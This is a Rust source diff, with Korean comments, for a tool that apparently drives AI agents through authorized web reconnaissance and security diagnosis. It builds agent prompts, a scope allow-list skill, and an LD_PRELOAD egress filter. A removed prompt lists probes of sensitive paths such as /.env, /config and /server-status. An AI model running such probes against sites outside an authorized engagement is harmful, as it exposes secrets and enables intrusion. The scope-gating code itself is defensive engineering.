+{DENIES}
+
+## Rules
+- Touch ONLY the allow targets above. If a redirect, link, or API response
+  points outside them, STOP that branch and report it as out-of-scope.
+- If NO allow target is listed, touch NOTHING on the network — local reasoning only.
+- Web recon uses `python_repl` with urllib/requests: read-only GET/HEAD,
+  10s timeout, at most 40 paths per host. No POST/PUT/DELETE, no brute force,
+  no destructive payloads, no mass requests.
+- Always use full `http(s)://host/...` URLs so the harness gate can audit them.
+- This machine's filesystem (bash/read/edit/write outside the session work dir)
+  is NOT a target — never snoop the local computer; write deliverables only.
+- Report format is dictated by the task prompt, not this skill.
+"#;
+
+/// 스코프 스킬 생성 — prime 세션 디렉터리에 SKILL.md 를 쓰고 경로를 돌려준다.
+fn write_scope_skill(dir: &Path, allows: &[String], denies: &[String]) -> Result<PathBuf, String> {
+    fs::create_dir_all(dir).map_err(|e| format!("스킬 디렉터리 생성 실패: {e}"))?;
+    let fmt = |xs: &[String]| {
+        if xs.is_empty() {
+            "(없음 — 네트워크 접촉 금지)".to_string()
+        } else {
+            xs.iter().map(|x| format!("- {x}")).collect::<Vec<_>>().join("\n")
+        }
+    };
+    let text = SCOPE_SKILL_TEMPLATE
+        .replacen("{ALLOWS}", &fmt(allows), 1)
+        .replacen("{DENIES}", &fmt(denies), 1);
+    let path = dir.join("SKILL.md");
+    fs::write(&path, text).map_err(|e| format!("스킬 기록 실패: {e}"))?;
+    Ok(path)
+}
+
+/// prime-agent 바이너리 탐색 — REDCELL_PRIME_BIN 환경변수 → PATH.
+fn prime_agent_path() -> Result<PathBuf, String> {
+    if let Some(d) = std::env::var_os("REDCELL_PRIME_BIN") {
+        let b = PathBuf::from(d);
+        if b.is_file() {
+            return Ok(b);
+        }
+        return Err(format!(
+            "REDCELL_PRIME_BIN='{}' 파일을 찾을 수 없습니다.",
+            b.display()
+        ));
+    }
+    first_on_path("prime-agent").ok_or_else(|| {
+        "prime-agent 바이너리를 찾을 수 없습니다 (PATH에 없음).\n해결: prime-agent 를 설치해 PATH에 두거나, REDCELL_PRIME_BIN 환경변수로 바이너리 경로를 지정하세요. pi 엔진은 그대로 사용할 수 있습니다.".to_string()
+    })
+}
+
+/// prime-agent 모델 설정 경로: ~/.prime/agent/models.json (pi 와 동일 스키마).
+fn prime_models_json_path() -> Result<PathBuf, String> {
+    user_home()
+        .map(|h| h.join(".prime").join("agent").join("models.json"))
+        .ok_or_else(|| "홈 디렉터리(HOME/USERPROFILE)를 찾을 수 없습니다.".to_string())
+}
+
+/// prime-agent 세션 디렉터리 — 앱 데이터 prime-sessions/<세션id>/<태그>.
+fn prime_session_dir(app: &AppHandle, id: &str, tag: &str) -> PathBuf {
+    let d = root(app).join("prime-sessions").join(id).join(tag);
+    fs::create_dir_all(&d).ok();
+    fs::create_dir_all(d.join("work")).ok();
+    d
+}
+
+fn prime_session_has_history(dir: &Path) -> bool {
+    fs::read_dir(dir).map(|mut rd| rd.any(|_| true)).unwrap_or(false)
+}
+
+/// prime-agent 실행 인자 조립 — --mode json --print --skill --session-dir [--continue].
+/// 모델/키 규칙은 pi 와 동일 (--provider/--model/--api-key), custom/ollama 는
+/// ~/.prime/agent/models.json 에 병합한다 (실측: pi 와 동일 스키마).
+fn prime_run_args(
+    settings: &Settings,
+    provider: &str,
+    skill: &Path,
+    session_dir: &Path,
+    cont: bool,
+    instruction: String,
+) -> Result<(PathBuf, Vec<String>), String> {
+    let bin = prime_agent_path()?;
+    let mut args: Vec<String> = vec![
+        "--mode".into(),
+        "json".into(),
+        "--print".into(),
+        instruction,
+        "--skill".into(),
+        skill.to_string_lossy().into_owned(),
+        "--session-dir".into(),
+        session_dir.to_string_lossy().into_owned(),
+    ];
+    if cont {
+        args.push("--continue".into());
+    }
+    args.push("--provider".into());
+    args.push(provider.to_string());
+    let conn = settings.providers.get(provider).cloned().unwrap_or_default();
+    if provider == "custom" || provider == "ollama" {
+        let mpath = prime_models_json_path()?;
+        sync_pi_models_json_at(&mpath, provider, &conn.base_url, &conn.api_key, &conn.model)?;
+    }
+    {
+        let m = conn.model.trim().to_string();
+        if !m.is_empty() {
+            args.push("--model".into());
+            args.push(if provider == "custom" || provider == "ollama" { m } else { format!("{provider}/{m}") });
+        } else if provider == "anthropic" || provider == "openai" || provider == "openrouter" {
+            if let Some(d) = PROVIDER_CATALOG.iter().find(|x| x.name == provider) {
+                if !d.default_model.is_empty() {
+                    let d = d.default_model.to_string();
+                    args.push("--model".into());
+                    args.push(format!("{provider}/{d}"));
+                }
+            }
+        }
+    }
+    if !conn.api_key.trim().is_empty() {
+        args.push("--api-key".into());
+        args.push(conn.api_key.trim().to_string());
+    }
+    Ok((bin, args))
+}
+
+/// prime-agent 도구 안내 — web_fetch 이 없고 python_repl 이 유일 통로이므로(실측),
+/// urllib 읽기 전용 패턴을 지시문에 덧붙인다 (진단·워커·collector 공용).
+const PRIME_TOOLING: &str = r#"## prime-agent 도구 사용법 (반드시 준수)
+- 이 환경에는 web_fetch 같은 웹 도구가 없다. 웹 조회는 **python_repl 하나**로만 한다.
+- 패턴 (읽기 전용 GET/HEAD, 타임아웃 10초):
+  ```python
+  import urllib.request
+  req = urllib.request.Request("https://대상/...", headers={"user-agent": "Mozilla/5.0 (RedCell authorized-agent)"}, method="GET")
+  res = urllib.request.urlopen(req, timeout=10)
+  print(res.status, res.headers.get_content_type())
+  print(res.read(400_000).decode("utf-8", "replace"))
+  ```
+- 헤더·쿠키 원문이 필요하면 `res.headers.as_string()` 를 출력한다.
+- POST/PUT/DELETE·브루트포스·파괴적 페이로드·대량 요청 금지. 인가 밖 URL 은 시도조차 금지.
+- 로컬 파일(bash·read·edit·write)은 결과물 저장 외에 건드리지 않는다.
+"#;
+
+/// 단일 턴 지시문 조립 — pi/prime 공용. prime 은 web_fetch 언급을 python_repl+urllib 로
+/// 치환하고 PRIME_TOOLING 을 덧붙인다 (prime-agent 에 web_fetch 이 없음 — 실측).
+fn prime_adapt(instruction: String) -> String {
+    format!("{}\n{PRIME_TOOLING}", instruction.replace("web_fetch", "python_repl+urllib"))
+}
+
+fn turn_instruction(app: &AppHandle, s: &Session, engine: Engine) -> String {
+    let target = target_url(&s.host, s.port);
+    let mut goal = s.goal.trim().to_string();
+    if goal.is_empty() {
+        goal = if s.diag {
+            "이 서비스의 보안 진단 리포트를 작성해줘.".to_string()
+        } else {
+            "아래 사이트를 샅샅이 살펴보고 유용한 정보·정리된 자료를 찾아 정리해줘.".to_string()
+        };
+    }
+    let base = if s.diag {
+        // 서비스 진단 모드: 시니어 멘토 스타일 공격 시나리오 리포트.
+        let mem = memory_block(app, &s.host);
+        let scope = if s.host.trim().is_empty() {
+            "실측 없이 설명 기반 진단 — 추정은 [가정] 으로 표시".to_string()
+        } else {
+            format!(
+                "대상 사이트(인가됨): {target}\n{}\n실측 정찰 순서대로 서비스 모델을 세운 뒤 보고서를 작성한다.",
+                https_hint_for(&s.host, s.port)
+            )
+        };
+        format!("{DIAG_ROLE}\n\n## 서비스 설명\n\n{goal}\n\n## 진단 경계\n{scope}\n{mem}\n{REPORT_SPEC}")
+    } else if s.host.trim().is_empty() {
+        // 대상 미지정: 순수 CLI 대화(인가 게이트는 대상 없는 로컬 작업만 통과).
+        goal
+    } else {
+        let tool_line = if engine == Engine::Prime {
+            "중요: 웹 조사는 python_repl + urllib 로 수행한다(아래 PRIME_TOOLING 패턴)."
+        } else {
+            "중요: 웹 조사는 반드시 web_fetch 툴로 수행한다."
+        };
+        format!(
+            "{goal}\n\n대상 사이트(인가됨): {target}\n{}\n인가 목록에 있는 대상이므로 필요한 만큼 자유롭게 조사·탐색하고 결과를 정리해줘.\n{tool_line} 이 컴퓨터의 파일 시스템(bash/read/edit/write)은 조사 대상이 아니라 — 결과물 저장 외에 로컬 머신을 뒤지지 마라.",
+            https_hint_for(&s.host, s.port)
+        )
+    };
+    if engine == Engine::Prime && !s.host.trim().is_empty() {
+        prime_adapt(base)
+    } else {
+        base
+    }
+}
+
 /** prime 모드 실행: node <pi cli.js> --mode json -p "<목표>" — json 이벤트를 패널로 스트리밍. */
 fn run_prime(
     app: &AppHandle,
@@ -990,86 +1587,365 @@ fn run_prime(
     redcell: &str,
     provider: &str,
 ) -> Result<(), String> {
-    let cli = prime_cli_path(redcell)?;
-
     // 연속 대화: pi 세션 id 를 세션에 보관하고, 같은 id 로 --session-id 를 넘겨
     // CLI 처럼 이전 대화를 이어간다(첫 턴에 생성·저장, 이후 턴은 재사용).
-    let mut s2 = s.clone();
-    if s2.piq.trim().is_empty() {
-        let id8 = s2.id.chars().take(8).collect::<String>();
-        s2.piq = format!("rc-{id8}");
-        write_session_locked(app, &s2);
-    }
+    let s2 = ensure_piq(app, s);
     let piq = s2.piq.clone();
-
-    let port = s2.port;
-    let target = match port {
-        Some(p) if p == 443 || p == 8443 => format!("https://{}/", s2.host),
-        Some(p) => format!("http://{}:{}/", s2.host, p),
-        None => format!("http://{}/", s2.host),
-    };
-    let mut goal = s2.goal.trim().to_string();
-    if goal.is_empty() {
-        goal = if s2.diag {
-            "이 서비스의 보안 진단 리포트를 작성해줘.".to_string()
-        } else {
-            "아래 사이트를 샅샅이 살펴보고 유용한 정보·정리된 자료를 찾아 정리해줘.".to_string()
-        };
+    let mut instruction = turn_instruction(app, &s2, Engine::Pi);
+    // 단일 진단 모드에서도 P0 스윕 증거를 주입 (대상이 있을 때만).
+    if s2.diag && !s2.host.trim().is_empty() {
+        let sweep = run_p0_sweep(app, id, &s2.host, s2.port, &s2.auth_cookie, s2.danger_consent);
+        instruction.push_str(&p0_evidence_block(&sweep, 6000));
     }
-    let instruction = if s2.diag {
-        // 서비스 진단 모드: 설명 기반 공격 포인트 발굴 + 개선 권고 리포트.
-        let scope = if s2.host.trim().is_empty() {
-            "실측 없이 설명 기반 진단 — 추정은 [가정] 으로 표시".to_string()
-        } else {
-            let https_hint = match port {
-                Some(p) if p != 443 && p != 8443 => format!("https://{}:{}/ 로도 접속을 시도해볼 것(둘 다 확인).", s2.host, p),
-                _ => String::new(),
-            };
-            format!(
-"대상 사이트(인가됨): {target}
-
-보고서를 쓰기 **전에 반드시** 아래 실측 정찰을 web_fetch(비파괴 GET/HEAD) 로 수행하고,
-실제 응답·헤더·상태를 근거로 서비스 모델을 세운 뒤 보고서를 작성한다:
-① 홈페이지 GET + 헤더 — 기술스택·서버·보안 헤더(CSP, HSTS, X-Frame-Options, X-Content-Type-Options, Referrer-Policy) 점검
-② 쿠키 플래그(HttpOnly/Secure/SameSite) 점검
-③ 홈페이지 링크·폼·스크립트에서 엔드포인트·파라미터·API 수집(공격 표면)
-④ 흔한 민감/설계 경로를 각각 한 번씩 프로브: /robots.txt, /.well-known/security.txt, /sitemap.xml,
-   /openapi.json, /swagger, /admin, /login, /api, /health, /.env, /config, /favicon.ico, /server-status
-⑤ 리다이렉트·HTTPS 강제·응답 코드(200/301/403/500)로 배포·접근통제 정황 파악
-{https_hint}
-실제로 확인한 것만 [실증]/[징후] 로, 못 본 것은 [가정] 으로 정직하게 표기한다. 근거 없는 단정 금지." 
-            )
-        };
-        format!(
-            "{DIAG_METHOD}\n\n## 서비스 설명\n\n{goal}\n\n## 진단 경계\n{scope}\n\n로컬 컴퓨터 파일 시스템(bash/read/edit/write)은 절대 조사하지 말 것 — 결과물 저장 외에 이 머신을 뒤지지 마라."
-        )
-    } else if s2.host.trim().is_empty() {
-        // 대상 미지정: 순수 pi CLI 대화(인가 게이트는 대상 없는 로컬 작업만 통과).
-        goal
-    } else {
-        let https_hint = match port {
-            Some(p) if p != 443 && p != 8443 => format!("https://{}:{}/ 로도 접속을 시도해볼 것(둘 다 확인).", s2.host, p),
-            _ => String::new(),
-        };
-        format!(
-            "{goal}\n\n대상 사이트(인가됨): {target}\n{https_hint}\n인가 목록에 있는 대상이므로 필요한 만큼 자유롭게 조사·탐색하고 결과를 정리해줘.\n중요: 웹 조사는 반드시 web_fetch 툴로 수행한다. 이 컴퓨터의 파일 시스템(bash/read/edit/write)은 조사 대상이 아니라 — 결과물 저장 외에 로컬 머신을 뒤지지 마라."
-        )
-    };
 
     // RedCell 인가 확장(scope 게이트)을 `-e` 로 **명시 로드**한다 — 전역 설치·트러스트·settings
     // 병합이 없어도 패널에서 항상 게이트가 켜진다(다른 프로젝트의 pi 세션엔 영향 없음).
-    let ext_path = PathBuf::from(redcell).join("prime-agent").join("index.ts");
     let ev3 = json!({ "type": "note", "text": "[sys] 인가 게이트: RedCell 확장을 -e 로 명시 로드 — pi 의 모든 툴 호출을 인가 목록으로 검사합니다(이 세션만)." });
     let stamped3 = append_event(app, id, &ev3);
     app.emit("engagement-event", json!({ "sessionId": id, "event": stamped3 })).ok();
 
+    // 동기 프리플라이트 — pi 미설치면 즉시 Err (UI 즉시 안내).
+    prime_cli_path(redcell)?;
+    {
+        let ev = json!({ "type": "note", "text": format!("[sys] pi 턴 — session {piq}.") });
+        let stamped = append_event(app, id, &ev);
+        app.emit("engagement-event", json!({ "sessionId": id, "event": stamped })).ok();
+    }
+
+    let prep = prepare_engine_run(app, id, Engine::Pi, settings, provider, redcell, &piq, instruction)?;
+    let (child, pipes) = spawn_prepared(&prep, provider, settings)?;
+    app.state::<Procs>().0.lock().unwrap().insert(id.to_string(), child);
+    set_status(app, id, "running");
+    app.emit("engagement-status", json!({ "sessionId": id, "status": "running" })).ok();
+
+    // 펌프+마감은 백그라운드 스레드에서.
+    {
+        let app = app.clone();
+        let id = id.to_string();
+        let prefix = prep.tool_prefix;
+        thread::spawn(move || {
+            let outcome = pump_and_wait(&app, &id, &id, pipes, None, prefix, None);
+            finalize_run(&app, &id, &outcome, "pi");
+        });
+    }
+    Ok(())
+}
+
+/// 엔진 실행 준비물 — 스폰 전 확정 (인자·스킬·세션dir·게이트 재료).
+struct PreparedRun {
+    prog: PathBuf,
+    args: Vec<String>,
+    cwd: PathBuf,
+    tool_prefix: &'static str,
+    enforce_auth: Option<auth::AuthList>,
+    extra_env: Vec<(String, String)>,
+}
+
+/// 선행 차단(netfilter) .so 탐색 — REDCELL_NETFILTER_SO > 실행파일 옆 > cwd.
+fn netfilter_so_path() -> Option<PathBuf> {
+    if let Some(p) = std::env::var_os("REDCELL_NETFILTER_SO").filter(|p| !p.is_empty()) {
+        let p = PathBuf::from(p);
+        if p.is_file() {
+            return Some(p);
+        }
+        return None; // 명시 지정이 깨졌으면 폴백 탐색하지 않음 (설정 오류 은폐 방지)
+    }
+    let name = "libredcell_netfilter.so";
+    if let Ok(exe) = std::env::current_exe() {
+        if let Some(dir) = exe.parent() {
+            // 실행파일 옆 (배포 레이아웃 + build.rs 복사본).
+            let p = dir.join(name);
+            if p.is_file() {
+                return Some(p);
+            }
+            // deps/ 아래 exe(테스트) — 자기 옆 산출물 + 한 단계 위 프로필 디렉터리.
+            if dir.file_name().map(|f| f == "deps").unwrap_or(false) {
+                if let Some(par) = dir.parent() {
+                    let p = par.join(name);
+                    if p.is_file() {
+                        return Some(p);
+                    }
+                }
+            } else {
+                // dev exe 옆에 없으면 deps/ 원본 확인.
+                let p = dir.join("deps").join(name);
+                if p.is_file() {
+                    return Some(p);
+                }
+            }
+        }
+    }
+    let cwd = PathBuf::from(name);
+    if cwd.is_file() {
+        return std::fs::canonicalize(cwd).ok();
+    }
+    None
+}
+
+/// 프로바이더 API 호스트 — conn.base_url 우선, 없으면 카탈로그 기본값.
+fn provider_api_host(provider: &str, settings: &Settings) -> Option<String> {
+    let custom = settings.providers.get(provider).map(|c| c.base_url.trim()).filter(|s| !s.is_empty());
+    let base = custom.or_else(|| {
+        PROVIDER_CATALOG.iter().find(|p| p.name == provider).map(|p| p.base_url)
+    })?;
+    redcell_netfilter::extract_host(base)
+}
+
+/// ALLOW/DENY 스펙 조립 (순수 함수 — 테스트 용이).
+/// allows + 세션 대상 + 프로바이더 호스트, denies 는 제외로 전달한다.
+fn build_netfilter_spec(allows: &[String], denies: &[String], extra_hosts: &[String]) -> (String, String) {
+    let mut seen = std::collections::HashSet::new();
+    let mut allow: Vec<String> = Vec::new();
+    for raw in allows.iter().chain(extra_hosts.iter()) {
+        let t = raw.trim();
+        if t.is_empty() || !seen.insert(t.to_ascii_lowercase()) {
+            continue;
+        }
+        // 파싱 불가한 쓰레기는 여기서 제거 (쓰레기가 전체를 무력화하지 않게).
+        if redcell_netfilter::AllowEntry::parse(t).is_some() {
+            allow.push(t.to_string());
+        }
+    }
+    let mut deny: Vec<String> = Vec::new();
+    for raw in denies {
+        let t = raw.trim();
+        if !t.is_empty() && redcell_netfilter::AllowEntry::parse(t).is_some() {
+            deny.push(t.to_string());
+        }
+    }
+    (allow.join(","), deny.join(","))
+}
+
+/// 선행 차단 env 조립 — Linux + .so 존재 시에만 비어 있지 않음.
+/// 비어 있으면 호출자가 기존 방어(pi 훅 / 반응형 킬게이트)로 동작한다.
+fn netfilter_extra_env(
+    app: &AppHandle,
+    id: &str,
+    auth: &auth::AuthList,
+    provider: &str,
+    settings: &Settings,
+) -> Vec<(String, String)> {
+    if !cfg!(target_os = "linux") {
+        return vec![];
+    }
+    let Some(so) = netfilter_so_path() else {
+        return vec![];
+    };
+    let mut extra: Vec<String> = Vec::new();
+    if let Some(s) = read_session(app, id) {
+        if let Some(h) = redcell_netfilter::extract_host(&s.host) {
+            extra.push(h);
+        }
+    }
+    if let Some(h) = provider_api_host(provider, settings) {
+        extra.push(h);
+    }
+    let (allow, deny) = build_netfilter_spec(&auth.allows, &auth.denies, &extra);
+    let log = sessions_dir(app).join(format!("netfilter-{id}.log"));
+    let mut env = vec![
+        ("LD_PRELOAD".to_string(), so.to_string_lossy().into_owned()),
+        ("REDCELL_NETFILTER_ALLOW".to_string(), allow),
+        ("REDCELL_NETFILTER_LOG".to_string(), log.to_string_lossy().into_owned()),
+    ];
+    if !deny.is_empty() {
+        env.push(("REDCELL_NETFILTER_DENY".to_string(), deny));
+    }
+    env
+}
+
+/// 선행 차단 상태 노트 (활성/폴백을 실행마다 명시 — 보안 상태는 숨기지 않는다).
+fn emit_netfilter_note(app: &AppHandle, id: &str, active: bool) {
+    let text = if active {
+        "[sys] 선행 차단 활성화(Linux egress 필터) — 인가 밖 연결·DNS 는 호출 전에 차단됩니다(반응형 킬게이트와 이중 방어, 감사: sessions/netfilter-<id>.log)."
+    } else if cfg!(target_os = "linux") {
+        "[sys] 선행 차단 .so 없음 — 반응형 킬게이트로 동작합니다(`cargo build` 로 libredcell_netfilter.so 생성 시 활성화)."
+    } else {
+        "[sys] 선행 차단은 Linux 전용 — 이 OS 에서는 기존 방어(pi 훅/반응형 킬게이트)로 동작합니다."
+    };
+    let ev = json!({ "type": "note", "text": text });
+    let stamped = append_event(app, id, &ev);
+    app.emit("engagement-event", json!({ "sessionId": id, "event": stamped })).ok();
+}
+
+fn prepare_engine_run(
+    app: &AppHandle,
+    id: &str,
+    engine: Engine,
+    settings: &Settings,
+    provider: &str,
+    redcell: &str,
+    run_tag: &str,
+    instruction: String,
+) -> Result<PreparedRun, String> {
+    match engine {
+        Engine::Pi => {
+            let (cli, args, cwd) = pi_cli_args(settings, provider, redcell, run_tag, instruction)?;
+            let node = first_on_path("node").unwrap_or_else(|| PathBuf::from("node"));
+            let mut full = vec![cli.to_string_lossy().into_owned()];
+            full.extend(args);
+            // 선행 차단 (pi 확장 훅과 이중 방어).
+            let auth = auth::load(&resolve_app_auth_path(app));
+            let nf = netfilter_extra_env(app, id, &auth, provider, settings);
+            emit_netfilter_note(app, id, !nf.is_empty());
+            Ok(PreparedRun {
+                prog: node,
+                args: full,
+                cwd,
+                tool_prefix: "pi-툴",
+                enforce_auth: None,
+                extra_env: nf,
+            })
+        }
+        Engine::Prime => {
+            let auth = auth::load(&resolve_app_auth_path(app));
+            let sdir = prime_session_dir(app, id, run_tag);
+            let skill = write_scope_skill(&sdir.join("redcell-scope"), &auth.allows, &auth.denies)?;
+            let cont = prime_session_has_history(&sdir);
+            let (bin, args) = prime_run_args(settings, provider, &skill, &sdir, cont, instruction)?;
+            if auth.yaml {
+                let ev = json!({ "type": "note", "text": "[sys] 경고: 인가 파일이 정식 YAML 이라 prime-agent 반응형 킬게이트가 동작하지 않습니다 — 선행 차단(세션 대상 단일 호스트)으로 강제됩니다." });
+                let stamped = append_event(app, id, &ev);
+                app.emit("engagement-event", json!({ "sessionId": id, "event": stamped })).ok();
+            }
+            // 선행 차단 (반응형 킬게이트와 이중 방어 — 위반 호출의 첫 실행 자체를 막는다).
+            let mut extra_env = vec![("PRIME_AGENT_TELEMETRY".to_string(), "0".to_string())];
+            let nf = netfilter_extra_env(app, id, &auth, provider, settings);
+            emit_netfilter_note(app, id, !nf.is_empty());
+            extra_env.extend(nf);
+            Ok(PreparedRun {
+                prog: bin,
+                args,
+                cwd: sdir.join("work"),
+                tool_prefix: "prime-툴",
+                enforce_auth: if auth.yaml { None } else { Some(auth) },
+                extra_env,
+            })
+        }
+    }
+}
+
+fn spawn_prepared(
+    prep: &PreparedRun,
+    provider: &str,
+    settings: &Settings,
+) -> Result<(Child, PiPipes), String> {
+    let ee: Vec<(&str, &str)> = prep.extra_env.iter().map(|(k, v)| (k.as_str(), v.as_str())).collect();
+    launch_child(&prep.prog, &prep.args, &prep.cwd, provider, settings, &ee, "엔진 실행 실패")
+}
+
+/// 펌프+대기 — 등록된 자식을 펌핑하고 제거·대기한 뒤 outcome 을 확정한다.
+/// 레지스트리에 없으면(중지됨) aborted 로 마감한다.
+fn pump_and_wait(
+    app: &AppHandle,
+    id: &str,
+    proc_key: &str,
+    pipes: PiPipes,
+    worker: Option<WorkerTag>,
+    tool_prefix: &str,
+    enforce_auth: Option<auth::AuthList>,
+) -> PumpOutcome {
+    let enforce = enforce_auth.map(|auth| ScopeEnforce { proc_key: proc_key.to_string(), auth });
+    let mut oc = pump_pi_stdio(app, id, pipes, worker, tool_prefix, enforce);
+    match app.state::<Procs>().0.lock().unwrap().remove(proc_key) {
+        Some(mut c) => {
+            if !c.wait().map(|st| st.success()).unwrap_or(false) {
+                oc.failed = true;
+            }
+            oc
+        }
+        None => {
+            oc.aborted = true;
+            oc
+        }
+    }
+}
+
+/// 단일 실행 마감 — 완료 노트 + 상태 전이 (실행 중일 때만).
+fn finalize_run(app: &AppHandle, id: &str, outcome: &PumpOutcome, engine_label: &str) {
+    let ok = !outcome.failed && !outcome.aborted;
+    let ev2 = json!({ "type": "note", "text": if outcome.aborted {
+        format!("[중지] {engine_label} 실행이 중단됐습니다.")
+    } else if outcome.blocked {
+        format!("[차단] scope 위반으로 {engine_label} 실행을 중단했습니다 — 🛡 인가 대상 관리에서 범위를 확인하세요.")
+    } else if ok {
+        format!("[완료] {engine_label} 종료.")
+    } else {
+        format!("[완료] {engine_label} 비정상 종료 — [오류] 노트를 확인하세요.")
+    }});
+    let stamped = append_event(app, id, &ev2);
+    app.emit("engagement-event", json!({ "sessionId": id, "event": stamped })).ok();
+    if let Some(cur) = read_session(app, id) {
+        if cur.status == "running" {
+            let st = if ok { "done" } else { "error" };
+            set_status(app, id, st);
+            app.emit("engagement-status", json!({ "sessionId": id, "status": st })).ok();
+        }
+    }
+}
+
+/// prime-agent 단일 턴 — 스코프 스킬 주입 + 반응형 킬게이트 + 세션 dir 연속대화.
+fn run_prime_agent(
+    app: &AppHandle,
+    id: &str,
+    s: &Session,
+    settings: &Settings,
+    provider: &str,
+) -> Result<(), String> {
+    let mut instruction = turn_instruction(app, s, Engine::Prime);
+    if s.diag && !s.host.trim().is_empty() {
+        let sweep = run_p0_sweep(app, id, &s.host, s.port, &s.auth_cookie, s.danger_consent);
+        instruction.push_str(&p0_evidence_block(&sweep, 6000));
+    }
+
+    let ev3 = json!({ "type": "note", "text": "[sys] 인가 게이트: 스코프 스킬 주입 + 반응형 킬게이트 — prime-agent 의 모든 툴 호출을 인가 목록으로 검사하고 위반 시 프로세스를 중단합니다(이 세션만)." });
+    let stamped3 = append_event(app, id, &ev3);
+    app.emit("engagement-event", json!({ "sessionId": id, "event": stamped3 })).ok();
+
+    // 동기 프리플라이트 — 바이너리 미설치면 즉시 Err.
+    prime_agent_path()?;
+    {
+        let ev = json!({ "type": "note", "text": "[sys] prime-agent 턴 — Rust 하네스 직접 실행." });
+        let stamped = append_event(app, id, &ev);
+        app.emit("engagement-event", json!({ "sessionId": id, "event": stamped })).ok();
+    }
+
+    let prep = prepare_engine_run(app, id, Engine::Prime, settings, provider, "", "main", instruction)?;
+    let (child, pipes) = spawn_prepared(&prep, provider, settings)?;
+    app.state::<Procs>().0.lock().unwrap().insert(id.to_string(), child);
+    set_status(app, id, "running");
+    app.emit("engagement-status", json!({ "sessionId": id, "status": "running" })).ok();
+
+    {
+        let app = app.clone();
+        let id = id.to_string();
+        let prefix = prep.tool_prefix;
+        let auth = prep.enforce_auth;
+        thread::spawn(move || {
+            let outcome = pump_and_wait(&app, &id, &id, pipes, None, prefix, auth);
+            finalize_run(&app, &id, &outcome, "prime-agent");
+        });
+    }
+    Ok(())
+}
+
+/// pi print 인자 조립 — run_prime·deep 워커·collector 공용.
+/// (models.json 동기화 포함. pi 1.3.0 플래그: -e/--mode/--session-id/-p/--provider/--model/--api-key)
+fn pi_cli_args(
+    settings: &Settings,
+    provider: &str,
+    redcell: &str,
+    piq: &str,
+    instruction: String,
+) -> Result<(PathBuf, Vec<String>, PathBuf), String> {
+    let cli = prime_cli_path(redcell)?;
+    let ext_path = PathBuf::from(redcell).join("prime-agent").join("index.ts");
     let mut args: Vec<String> = vec![
         "-e".into(),
         ext_path.to_string_lossy().into_owned(),
         "--mode".into(),
         "json".into(),
         "--session-id".into(),
-        piq.clone(),
+        piq.to_string(),
         "-p".into(),
         instruction,
     ];
@@ -1103,20 +1979,32 @@ fn run_prime(
         args.push("--api-key".into());
         args.push(conn.api_key.trim().to_string());
     }
+    Ok((cli, args, prime_cwd(redcell)))
+}
 
-    {
-        let ev = json!({ "type": "note", "text": format!("[sys] prime-agent(pi) 턴 — session {piq}: node {} {}…", cli.display(), args.get(5).map(|a| a.chars().take(60).collect::<String>()).unwrap_or_default()) });
-        let stamped = append_event(app, id, &ev);
-        app.emit("engagement-event", json!({ "sessionId": id, "event": stamped })).ok();
-    }
+struct PiPipes {
+    out: BufReader<ChildStdout>,
+    err: BufReader<ChildStderr>,
+}
 
-    let node = first_on_path("node").unwrap_or_else(|| PathBuf::from("node"));
-    let mut cmd = Command::new(node);
-    cmd.arg(cli.as_os_str());
-    cmd.current_dir(prime_cwd(redcell));
-    cmd.args(&args);
-    // 인가 게이트 명시 활성화: 확장의 tool_call 훅이 이 세션에서만 fail-closed 로 동작한다.
+/// 엔진 자식 프로세스 스폰 — REDCELL_GATE=1 + 프로바이더 env 주입 (+ 추가 env).
+fn launch_child(
+    prog: &Path,
+    args: &[String],
+    cwd: &Path,
+    provider: &str,
+    settings: &Settings,
+    extra_env: &[(&str, &str)],
+    err_hint: &str,
+) -> Result<(Child, PiPipes), String> {
+    let mut cmd = Command::new(prog);
+    cmd.current_dir(cwd);
+    cmd.args(args);
+    // 인가 게이트 명시 활성화: pi 확장의 tool_call 훅이 이 세션에서만 fail-closed 로 동작한다.
     cmd.env("REDCELL_GATE", "1");
+    for (k, v) in extra_env {
+        cmd.env(k, v);
+    }
     if let Some(conn) = settings.providers.get(provider) {
         inject_provider_env(&mut cmd, provider, conn);
     }
@@ -1125,128 +2013,263 @@ fn run_prime(
         .stdout(Stdio::piped())
         .stderr(Stdio::piped())
         .spawn()
-        .map_err(|e| format!("node(pi) 실행 실패 — node 설치 및 PATH 확인: {e}"))?;
+        .map_err(|e| format!("{err_hint}: {e}"))?;
+    let out = child.stdout.take().map(BufReader::new).ok_or("stdout 파이프 실패")?;
+    let err = child.stderr.take().map(BufReader::new).ok_or("stderr 파이프 실패")?;
+    Ok((child, PiPipes { out, err }))
+}
 
-    let stdout = child.stdout.take().ok_or("stdout 파이프 실패")?;
-    let stderr = child.stderr.take().ok_or("stderr 파이프 실패")?;
-    app.state::<Procs>().0.lock().unwrap().insert(id.to_string(), child);
-    set_status(app, id, "running");
-    app.emit("engagement-status", json!({ "sessionId": id, "status": "running" })).ok();
 
-    // stderr → [sys] 노트(모델/스코프 로그).
-    {
-        let app = app.clone();
-        let id = id.to_string();
-        thread::spawn(move || {
-            for line in BufReader::new(stderr).lines().map_while(Result::ok) {
-                let line = line.trim();
-                if line.is_empty() {
-                    continue;
-                }
-                let ev = json!({ "type": "note", "text": format!("[sys] {line}") });
-                let stamped = append_event(&app, &id, &ev);
-                app.emit("engagement-event", json!({ "sessionId": id, "event": stamped })).ok();
-            }
-        });
+/// 심층 진단 워커 태그 — 이벤트에 worker id 를 찍고 UI 칩과 연결한다.
+#[derive(Clone)]
+struct WorkerTag {
+    id: String,
+    label: String,
+}
+
+/// 노트 1건 저장 + 프론트 전송 (워커 태그가 있으면 접두 + worker 필드).
+fn emit_note(app: &AppHandle, id: &str, text: String, worker: Option<&WorkerTag>) {
+    let ev = match worker {
+        Some(w) => json!({ "type": "note", "text": format!("[{}] {}", w.label, text), "worker": w.id }),
+        None => json!({ "type": "note", "text": text }),
+    };
+    let stamped = append_event(app, id, &ev);
+    app.emit("engagement-event", json!({ "sessionId": id, "event": stamped })).ok();
+}
+
+#[allow(dead_code)] // settled: 프로토콜 완성도용 플래그 (완료 판정은 failed/aborted+exit)
+struct PumpOutcome {
+    text: String, // 어시스턴트 텍스트 전체 누적 (워커 발견·collector 입력용)
+    failed: bool, // stopReason=error / exit≠0 계열
+    aborted: bool, // stopReason=aborted / settled(aborted) / 중지 kill
+    settled: bool, // agent_settled 수신 (pi 1.3 정식 완료 신호)
+    blocked: bool, // 반응형 스코프 게이트 발동 (인가 밖 툴 호출로 kill)
+}
+
